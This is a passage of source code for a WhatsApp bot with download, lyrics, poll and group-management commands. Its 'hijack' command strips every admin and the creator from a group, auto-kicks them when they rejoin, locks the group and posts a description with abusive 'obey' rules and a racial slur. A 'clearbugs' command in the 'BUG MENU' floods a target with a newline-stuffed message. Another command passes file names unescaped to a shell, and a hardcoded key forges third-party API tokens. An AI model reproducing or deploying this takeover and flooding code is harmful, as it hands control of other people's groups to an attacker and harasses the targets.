                isForwarded: true,
                forwardingScore: 99999,
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    previewType: 2,
                    mediaUrl: url,
                    title: title,
                    body: `views: ${video.views} / duration: ${video.timestamp}`,
                    sourceUrl: url,
                    thumbnail: thumbnail,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: zets });

    } catch (error) {
        console.error('Error:', error);
        reply('Could not find your song.');
    }
}
break
        //========================================================\\
        
    case "video":
    case "vid":{
                if (!text) return reply(`\n*ᴇxᴀᴍᴘʟᴇ:* ${prefix + command} golden\n`)
           await Void.sendMessage(m.chat, {
 react: { text: '🎥', key: m.key }
 });   try{  
              await reply(`processing your request`);
                let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.video

                Void.sendMessage(m.chat, {
                    video: { url: crot },
                    mimetype: "video/mp4", 
                    ptt: true
                    
                }, { quoted:m });
                }catch (err) {
console.error('ᴇʀʀᴏʀ ᴡʜɪʟᴇ ғᴇᴛᴄʜɪɴɢ ᴠɪᴅᴇᴏ:', err);
await reply(`ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ: ${error.message}`);
}
                
}
break      
 
    

         
 
        //========================================================\\
  case 'play': 
case 'ytplay': {
if (!text) return reply(`Example: ${prefix + command} golden`);
try {		
let search = await yts(`${text}`);
if (!search || search.all.length === 0) return reply(`*!* ☹️`);
let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
let caption = `「 *YOUTUBE PLAY* 」\n\n🆔 ID : ${videoId}\n💬 Title : ${title}\n📺 Views : ${views}\n⏰ Duration : ${duration.timestamp}\n▶️ Channel : ${author.name}\n📆 Upload : ${ago}\n🔗 URL Video : ${url}\n📝 Description : ${description}`;
Void.sendMessage(m.chat,{
image: { url: image },
caption: caption,
footer: `${global.foother}`,
buttons: [
{
buttonId: `${prefix}song ${text}`,
buttonText: {
displayText: "ᴠᴏɪᴄᴇɴᴏᴛᴇ🎙️"
}
},
    {
buttonId: `${prefix}play1 ${text}`,
buttonText: {
displayText: "Aᴜᴅɪᴏ🎧"
}
},
{
buttonId: `${prefix}video ${url}`,
buttonText: {
displayText: "Vɪᴅᴇᴏ🎥"
}
}
],
viewOnce: true,
}, {
quoted: zets
});
} catch (err) {
console.error(err);
reply(`*error!* 😭\n${err.message || err}`);
}
}
break
case 'savenumber': {
    try {
        const input = args.join(' '); // args = ['08123456789,', 'John', 'Doe']
        const [numberPart, ...nameParts] = input.split(',');
        const number = numberPart?.trim();
        const name = nameParts.join(',').trim();

        if (!number || !name) {
            return reply('❌ Use the format: savenumber number, name\nExample: savenumber 08123456789, mary dane');
        }

        const fs = require('fs');
        const filePath = './savedNumbers.json';

        // Create file if it doesn't exist
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify([]));
        }

        const savedList = JSON.parse(fs.readFileSync(filePath));
        savedList.push({ number, name });

        fs.writeFileSync(filePath, JSON.stringify(savedList, null, 2));

        reply(`✅ Number saved: ${name} (${number})`);
    } catch (err) {
        console.error(err);
        reply('❌ An error occurred while saving the number.');
    }
}
break;
case 'hijack': {
  if (!isCreator) return reply("Sorry, owner only") 
  if (!m.isGroup) {
    reply('This command can only be used in groups!');
    return;
  }

  const botNumber = Void.user.id || Void.user.jid.split(':')[0]; // Bot's JID
  const botDeployer = m.sender; // Dynamically use the deployer's JID
  const groupMetadata = await Void.groupMetadata(m.chat);
  const participants = groupMetadata.participants;

  const isAdmins = participants.some(participant => participant.id === m.sender && participant.admin);
  if (!isAdmins) {
    reply('Only group admins can use this command!');
    return;
  }

  const creator = groupMetadata.owner; // Group creator's JID
  const admins = participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin');

  // Avoid removing the bot and deployer's JID
  for (let admin of admins) {
    if (admin.id !== botNumber && admin.id !== botDeployer) { // Exclude bot and deployer
      try {
        await Void.groupParticipantsUpdate(m.chat, [admin.id], 'remove');
        reply(`🔥 Removed admin: @${admin.id.split('@')[0]}`);
      } catch (err) {
        console.log(`Failed to remove admin: ${admin.id}`);
        reply(`Error: Could not remove admin @${admin.id.split('@')[0]}.`);
      }
    }
  }

  // Attempt to remove the group creator (if the creator isn't the bot or deployer)
  if (creator && creator !== botDeployer && creator !== botNumber) { // Exclude bot and deployer
    try {
      await Void.groupParticipantsUpdate(m.chat, [creator], 'remove');
      reply(`🔥 Successfully removed the group creator: @${creator.split('@')[0]}`);
    } catch (error) {
      console.error(`Error removing group creator: ${error}`);
      reply('⚠️ Could not remove the creator. Restricting their activity instead.');

      // Restrict messages for the creator
      try {
        await Void.groupSettingUpdate(m.chat, 'announcement');
        reply('🚫 Group switched to admins-only mode to restrict the creator.');
      } catch (restrictError) {
        console.log(`Error restricting creator: ${restrictError}`);
      }
    }
  }

  // Change group name
  try {
    await Void.groupUpdateSubject(m.chat, 'ᴀʟʟ ʜᴀɪʟ 𝐕𝐎𝐈𝐃ᴥ 〔𝖧𝖨𝖬𝖲𝖤𝖫𝖥〕 亗');
    reply('👑 Group name changed to ʜᴀɪʟ 𝐕𝐎𝐈𝐃! ');
  } catch (error) {
    console.error(`Error changing group name: ${error}`);
    reply('⚠️ Could not change group name.');
  }

  // Change group description
    // Change group description
  try {
    await Void.groupUpdateDescription(m.chat, `Welcome to ☩ Equalizer ☩ ɢᴄ Hijacked gc By 𝐕𝐎𝐈𝐃ᴥ 〔𝖧𝖨𝖬𝖲𝖤𝖫𝖥〕 亗

This group has been hijacked by 𝐕𝐎𝐈𝐃ᴥ 〔𝖧𝖨𝖬𝖲𝖤𝖫𝖥〕 亗 All members are required to obey the rules and respect the hierarchy.

**Lᴏʀᴅ Dᴇᴍᴍʏ Rᴜʟᴇs :**

1. Absolute Obedience: Obey without question.
3. No Disrespect: No disrespect will be tolerated.
4. No Sharing of Group Content: All content shared within the group is proprietary.
5. Zero Tolerance for Betrayal: Any betrayal will be dealt with swiftly and severely.
6. Mandatory Participation: All members must participate in group activities.
7. No External Links or Invites: No external links or invites allowed.
8. Respect the Hierarchy: Respect the hierarchy of the group.
9. No Spam or Self-Promotion: No spam or self-promotion allowed.
10. 𝕯𝖊𝖒𝖒𝖞 𝕿𝖊𝖈𝖍 is Always Right: In all matters, King NIGER Dorm' decision is final.

**Consequences of Breaking the Rules:**

* First offense: Warning and temporary removal
* Second offense: Permanent removal
* Third offense: Public shaming and ridicule

By joining this group, you acknowledge that you have read, understand, and will abide by these rules.`);
    reply('📝 Group description changed!');
  } catch (error) {
    console.error(`Error changing group description: ${error}`);
    reply('⚠️ Could not change group description.');
  }

  // Lock group
  try {
    await Void.groupSettingUpdate(m.chat, 'locked');
    reply('🔒 Group locked!');
  } catch (error) {
    console.error(`Error locking group: ${error}`);
    reply('⚠️ Could not lock group.');
  }

  // Set up a list to track participants who have already been kicked
  let kickedParticipants = [];

  // Watch for rejoining participants (creator or removed admins)
  Void.ev.on('group-participants.update', async (update) => {
    const rejoiningParticipants = update.participants;

    for (let participant of rejoiningParticipants) {
      // Ensure we only kick the creator or removed admins once
      if ((participant === creator || admins.some(admin => admin.id === participant)) && !kickedParticipants.includes(participant)) {
        try {
          await Void.groupParticipantsUpdate(m.chat, [participant], 'remove');
          reply(`P̞̝̾ͤ͜͡💥͇͇̗͙̘͈̜̝💥͔̬͢͡U͡💥̜̞̬͈̭̪͎̠͖̥͕̫ͤ̄͜💥̷͓͠Radiation ⃟⃟💥 Auto-kicked rejoining participant: @${participant.split('@')[0]}`);
          kickedParticipants.push(participant);
        } catch (error) {
          console.error(`Error auto-kicking participant: ${error}`);
        }
      }
    }
  });
}
break
 case 'clearbugs': {
if (!isCreator) return reply(`Sorry, owner only`)
if (!q) return reply(`Example:\n ${prefix + command} 234xxx`)
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Void.sendMessage(target, {text: `\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
}
break;
  
// ================= BUG MENU ================= //
case "owner": {
reply(`Dᴇᴠᴇʟᴏᴘᴇʀ Iɴғᴏʀᴍᴀᴛɪᴏɴ
Dᴇᴠ Nᴀᴍᴇs : Lᴏʀᴅ Dᴇᴍᴍʏ ☩ ᴊᴇᴅɪx Tᴇʟᴇɢʀᴀᴍ Usᴇʀɴᴀᴍᴇ : https://t.me/onlyone_Void\nWʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ: https://wa.me/2349055\nWʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ : https://whatsapp.com/channel/0029Vb7tekFBlHpXQGMz0L2q\nWʜᴀᴛsᴀᴘᴘ Gʀᴏᴜᴘ: https://chat.whatsapp.com/DvyOys4Wfk4DPJD0Wf2T5Q\nSᴜʙsᴄʀɪʙᴇ ᴛᴏ ᴍʏ ᴡʜᴀᴛsᴀᴘᴘ ᴄʜᴀɴɴᴇʟ`)
}
break
//===========================================
case "credits": {
let tqtoo = `
\`➢ Thanks To\`
➯ Oᴡɴᴇʀ Dᴇᴍᴍʏ
➯ Fʀɪᴇɴᴅ Tʀᴜsᴛ
➯ Fʀɪᴇɴᴅ Zᴇᴍᴏʏᴀ
➯ Sᴜᴘᴘᴏʀᴛ ʏᴀʟʟ`
let buttons = [
{ buttonId: ".owner", buttonText: { displayText: "Cᴏɴᴛᴀᴄᴛ ᴏᴡɴ/ᴅᴇᴠ" } }, 
{ buttonId: ".menu", buttonText: { displayText: "Bᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ" } }
];
let buttonMessage = {
image: { url: `https://files.catbox.moe/n1at78.jpeg` },
gifPlayback: true,
caption: tqtoo,
contextInfo: {
	forwardingScore: 999,
	isForwarded: true,
	forwardedNewsletterMessageInfo: {
		newsletterJid: "120363331321673219@newsletter",
		newsletterName: "ᴄʟɪᴄᴋ ʜᴇʀᴇ ᴛᴏ ғᴏʟʟᴏᴡ ᴅᴇᴠ 𝐕𝐎𝐈𝐃"
	}
},
footer: "𝗍һᥲᥒks 𝖿᥆r ᑲᥙᥡіᥒg",
buttons: buttons,
viewOnce: true,
headerType: 6
};
await Void.sendMessage(m.chat, buttonMessage, { quoted: zets });
}
break;
//==========================================
case 'setname':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply(`Where's the name?\Example: ${prefix + command}`)
await updateProfileName(text)
reply(`Success in changing the name of bot's number`)
}
break;
//==========================================
case 'setbio':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply(`Where's the name?\nExample: ${prefix + command}`)
await Void.updateProfileStatus(text)
reply(`Success in changing the bio of bot's number`)
}
break
//==========================================
case 'getcase': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
const getCases = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("./start/case.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getCases(q)}`)}
break;
//==========================================
case 'setgcname': case 'setgroupname': case 'setsubject': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply('Text ?')
await Void.groupUpdateSubject(m.chat, text)
await reply(`Done`)
}
break;
//==========================================
case 'setgcdesc': case 'setdesk': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply('owner only')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!text) return reply('Text ?')
await Void.groupUpdateDescription(m.chat, text)
await reply(`Done`)
}
break
 //====================

        
        
case 'script': {
    if (!isCreator) return
    let peler = `

> https://whatsapp.com/channel/0029Vb7tekFBlHpXQGMz0L2q
Jᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ғᴏʀ ᴍᴏʀᴇ ʙᴏᴛ ᴜᴘᴅᴀᴛᴇs ʟɪᴋᴇ ☩ Equalizer ☩

© 𝐕𝐎𝐈𝐃 ᴛᴇᴄʜ ɪɴᴄ`
    Void.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `𝕽𝖆𝖉𝖎𝖆𝖙𝖎𝖔𝖓 𝖁𝖊𝖗𝖘𝖎𝖔𝖓 4`,
                body: `☩ Equalizer ☩ ᴠ4 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/n1at78.jpeg',
                thumbnail: ``,
                sourceUrl: `https://t.me/onlyone_Void`
            }
        }
    }, { quoted: zets });
};
break;    
case 'support': {
    if (!isCreator) return
    let peler = `

ᴛʜɪs sᴄʀɪᴘᴛ ʜᴀs ʙᴇᴇɴ ᴡᴏʀᴋᴇᴅ ᴏɴ ʙʏ ᴊᴜx 2 ᴅᴇᴠs, sᴛɪʟʟ ᴡᴏʀᴋɪɴɢ ᴏɴ ɪᴛ, sᴜᴘᴘᴏʀᴛ ᴜs ʙʏ ғᴏʟʟᴏᴡɪɴɢ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs

𝗠𝗔𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
https://whatsapp.com/channel/0029Vb7tekFBlHpXQGMz0L2q

𝗠𝗮𝗶𝗻 𝗚𝗰(𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗴𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗻𝗼 𝗰𝗵𝗮𝘁𝘀) 
https://chat.whatsapp.com/DcPBHPuIYACEf601jGjDqv?mode=r_t 

𝗕𝗖𝗞 𝗨𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
https://whatsapp.com/channel/0029VaPwbu60rGiGCSn1M80y

𝗕𝗰𝗸 𝘂𝗽 𝗴𝗰
https://chat.whatsapp.com/DB0CgJmpm7d0zpk6DbiPhc?mode=r_t

𝗬𝘁 𝗰𝗵𝗮𝗻𝗻𝗲𝗹(how to deploy a bot) 
https://youtu.be/_ZNjHGioeBY?si=PXeFzkgOlDgVO9io`
    Void.sendMessage(m.chat, { 
        text: peler,
        contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `☩ Equalizer ☩ ᴠᴇʀsɪᴏɴ 4`,
                body: `☩ Equalizer ☩ ᴠ4 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/n1at78.jpeg',
                thumbnail: ``,
                sourceUrl: `https://Voidtech`
            }
        }
    }, { quoted: zets });
};
break;
//==========================================
case 'toimage': 
case 'toimg': {
if (!isCreator) return
if (!/webp/.test(mime)) return reply(`reply sticker with caption *${prefix + command}*`)
let media = await Void.downloadAndSaveMediaMessage(quoted)
await reaction(m.chat, "⚡")
let ran = await getRandomFile('.png')  
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err 
let buffer = fs.readFileSync(ran)   
Void.sendMessage(m.chat, {   
image: buffer     
}, { quoted: zets })
fs.unlinkSync(ran)
}
)
}
break;
//==========================================
case 'lyrics': {
    const axios = require('axios');

    if (!args[0]) return m.reply('Please provide a song title.\nExample: *.lyrics Shape of You*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɪʀᴇ');

    const songTitle = args.join(" ");
    const apiUrl = `https://kaiz-apis.gleeze.com/api/shazam-lyrics?title=${encodeURIComponent(songTitle)}`;

    try {
        const res = await axios.get(apiUrl);
        const data = res.data;

        if (!data || !data.lyrics) {
            return m.reply('Sorry, no lyrics found for this song.\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐕𝐎𝐈𝐃 ᴛᴇᴄʜ');
        }

        const lyrics = data.lyrics;

        // Send the lyrics as a message
        await Void.sendMessage(m.chat, {
            text: `*𝗦𝗼𝗻𝗴:* _${songTitle}_\n\n*𝗟𝘆𝗿𝗶𝗰𝘀:*\n\n${lyrics}`
        }, { quoted: m });

    } catch (err) {
        console.error('Lyrics Error:', err);
        m.reply("An error occurred while fetching the lyrics.\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝐕𝐎𝐈𝐃 ᴛᴇᴄʜ");
    }
}
break
case 'tolyrics': {
function generateToken(secretKey) {
 const timestamp = Date.now().toString();
 const hmac = crypto.createHmac('sha256', secretKey);
 hmac.update(timestamp);
 const token = hmac.digest('hex');

 return {
 "x-timestamp": timestamp,
 "x-token": token
 };
}

async function Talknotes(buffer) {
 try {
 const form = new FormData();
 form.append('file', buffer, {
 filename: 'file1.mp3',
 contentType: 'audio/mpeg'
 });

 const tokenData = generateToken('w0erw90wr3rnhwoi3rwe98sdfihqio432033we8rhoeiw');
 const headers = {
 ...form.getHeaders(),
 'x-timestamp': tokenData['x-timestamp'],
 'x-token': tokenData['x-token'],
 "authority": "api.talknotes.io",
 "method": "POST",
 "path": "/tools/converter",
 "scheme": "https",
 "accept": "*/*",
 "accept-encoding": "gzip, deflate, br",
 "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
 "origin": "https://talknotes.io",
 "referer": "https://talknotes.io/",
 "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
 "sec-ch-ua-mobile": "?1",
 "sec-ch-ua-platform": "\"Android\"",
 "sec-fetch-dest": "empty",
 "sec-fetch-mode": "cors",
 "sec-fetch-site": "same-site",
 "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36"
 };

 const response = await axios.post('https://api.talknotes.io/tools/converter', form, { headers });
 return response.data;
 } catch (error) {
 console.error("An error occurred:", error.message);
 return null;
 }
}
 
 if (!/audio|video/.test(mime)) {
 return reply('reply video/ audio using .tolyrics');
 }
 
 reply('*Please Wait...*');
 
 try {
 let buffer = await quoted.download();
 
 const fileSizeInBytes = buffer.length;
 const maxSize = 5 * 1024 * 1024;

 if (fileSizeInBytes > maxSize) {
 return reply("Max Size 5 MB Yaa");
 }

 const result = await Talknotes(buffer);
 
 if (!result || !result.text) {
 return reply('avoid spam');
 }
 
 reply(`*Result :*\n\n${result.text}`);
 
 } catch (error) {
 console.error(error);
 reply('error.');
 }
};
          break;
          case 'groupjid':{
          if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
        const groupMetadata = m.isGroup ? await Void.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is the jid address of all the users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      reply(textt)
    }
    break;
    case 'poll': {
    if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await reply(
`State the question and at least 2 options\nExample: ${prefix}poll am i trust?|yes,no, maybe...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await Void.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break;
case'tagall':{
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for my owner only.");
        if (!m.isGroup) return reply(mess.group);
        const textMessage = args.join(" ") || "ᴀʟʟ ʜᴀɪʟ 𝐕𝐎𝐈𝐃";
        let teks = `\`mf tagall\` :\n> *${textMessage}*\n\n`;

        const groupMetadata = await Void.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        Void.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: m });
      }
      break;
case 'hidetag': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for my owner only.");
Void.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break;
case 'promote': {
if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('you are not an admin!!')
if (!isBotAdmins) return reply('_Bot is not an admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Void.groupParticipantsUpdate(m.chat, [users], 'promote')
await reply(`Done`)
}
break
case 'demote': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isAdmins) return reply('Admins ony!!')
if (!isBotAdmins) return reply('_bot is not an admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Void.groupParticipantsUpdate(m.chat, [users], 'demote')
await reply(`Done`)
}
break;
case 'mute': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.isGroup) return reply('Groupchat only');
    if (!isAdmins) return reply('Admins only');
    if (!isBotAdmins) return reply('Bot must be an admin');

    try {
        await Void.groupSettingUpdate(m.chat, 'announcement'); // Mute group
        reply('_Group has been muted._\nOnly admins can send messages now.');
    } catch (error) {
        console.error(error);
        reply('Failed to mute the group. Please try again.');
    }
}
break;
case 'unmute': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
    if (!m.isGroup) return reply('𝐠𝐜 𝐨𝐧𝐥𝐲.');
    if (!isAdmins) return reply('`𝐚𝐝𝐦𝐢𝐧𝐬 𝐨𝐧𝐥𝐲');

    try {
        await Void.groupSettingUpdate(m.chat, 'not_announcement'); // Unmute group
        reply('Group has been unmuted```.\nEveryone can send messages now*.');
    } catch (error) {
        console.error(error);
        reply(' Failed to unmute the group. Please try again.');
    }
}
        break;
case 'left': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply("for Owner only.");
await Void.groupLeave(m.chat)
await reply(`Done`)
            }
            break;
case 'add': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!isCreator) return m.reply(" Owner only.");
if (!m.isGroup) return reply(mess.only.group)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Void.groupParticipantsUpdate(m.chat, [users], 'add')
await replynano(`Done`)
}
break;
case 'kick': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.quoted) return reply(" `tag a user to kick them");
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins ) return reply('admins only!!')
if (!isBotAdmins) return reply('_Bot must be admin_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Void.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}

break;      
case 'delete': case 'del': {
if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
   if (!isCreator) return reply("Owner only.");
if (!m.quoted) throw false
let { chat, id } = m.quoted
 Void.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break;
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
            if (isban) return reply(' RECENTLY BANNED FROM ACCESSING THIS BOT');
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot must be admin_')
let response = await Void.groupInviteCode(m.chat)
Void.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break;
